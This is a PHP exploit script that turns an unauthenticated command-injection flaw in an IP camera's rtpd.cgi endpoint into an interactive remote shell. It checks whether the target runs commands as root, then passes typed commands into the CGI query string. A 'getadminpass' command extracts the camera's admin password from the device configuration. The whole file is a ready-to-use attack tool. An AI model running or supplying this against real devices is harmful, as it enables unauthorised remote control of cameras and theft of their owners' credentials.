<?php

$options = getopt('u:');

if(!isset($options['u'])) {
  die("Option -u not set!\n");
}

// Run a inital check to make sure the camera is vulnerable
echo '';
$request  = request('whoami', 1);

if($request['body'] != 'root' && $request['status'] != 'HTTP/1.1 200 OK') {
  die("Sorry, the server specified isn't vulnerable.\n");
}

stream_set_blocking(STDIN, false);

$line = '';
$prompt = 'ipcamshell> ';

echo "Those who do not understand UNIX are condemned to reinvent it, poorly. — Henry Spencer\n";
echo $prompt;

while(true) {
  $c = fgetc(STDIN);
  if($c !== false) {
    if($c != "\n") {
      $line .= $c;
    } else {
      if($line == 'exit' || $line == 'quit') {
        break;
      } elseif($line == 'getadminpass') {
        // Fetch the admin password (lol, fail)
        $pass =  request('echo AdminPasswd_ss|tdb get HTTPAccount');
        $pass = str_replace('AdminPasswd_ss=', '', $pass);
        $pass = str_replace('"', '', $pass);

        echo "Username: admin\nPassword: {$pass}\n";
      } else {
        echo request($line)."\n";
      }

      echo $prompt;
      $line = '';
    }
  }
}

function request($string, $initial_check=0) {
  // Forgive me. Forgive me.
  global $options;

  $url = $options['u'].'/cgi-bin/rtpd.cgi?';

  // Replace spaces with ampersands, the CGI script replaces ampersands with spaces...
  $string = preg_replace("/[\s]/", "&", $string);
  $contents = @file_get_contents($url.$string);

  // We remove the last line here because it's useless junk
  $lines = explode("\n", trim($contents));
  unset($lines[count($lines) - 1]);
  $final = implode($lines, "\n");

  if($initial_check == 1) {
    $headers = @get_headers($url.$string);
    return array('body' => $final, 'status' => $headers[0]);
  }

  if($final == "") {
    return "warn: no output. run `tail /tmp/lighttpd.error.log -n 1` to see latest error.";
  }
  return $final;
}

// Stolen from Stack Overflow.
function parse_headers($header) {
  $parsed = array_map(function($x) { return array_map("trim", explode(":", $x, 2)); }, array_filter(array_map("trim", explode("\n", $header))));
}
